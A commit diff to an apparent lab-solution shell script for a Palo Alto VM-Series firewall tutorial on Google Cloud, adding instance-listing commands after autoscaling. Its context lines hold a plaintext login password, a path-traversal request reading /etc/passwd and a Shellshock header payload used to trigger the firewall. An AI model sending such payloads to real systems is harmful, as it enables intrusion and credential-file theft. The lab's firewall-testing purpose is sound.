ba6bc236fa0bd489a5ff17edae2f90d4407e548f
Tariq Ahmad <54164634+tariqsheikhsw@users.noreply.github.com>
2024-05-03 17:46:58 +0400

    Update GSP1115.sh

--- Solutions/GSP1115.sh
+++ Solutions/GSP1115.sh
@@ -5,7 +5,7 @@ gcloud compute instances list \
     --format='value(EXTERNAL_IP)'
 
 
-ssh paloalto@34.76.6.210
+ssh paloalto@X.X.X.X
 //Pal0Alt0@123
 
 wget www.eicar.org/download/eicar.com.txt
@@ -14,4 +14,10 @@ curl http://10.1.0.10/cgi-bin/../../../..//bin/cat%20/etc/passwd
 curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://10.1.0.10/cgi-bin/test-critical
 
 
+//After AutoScaling min=2 max=3
 
+gcloud compute instances list \
+    --filter='tags.items=(vmseries-tutorial)' \
+    --format='value(EXTERNAL_IP)'
+
+//2 IPs X.X.X.X and Y.Y.Y.Y
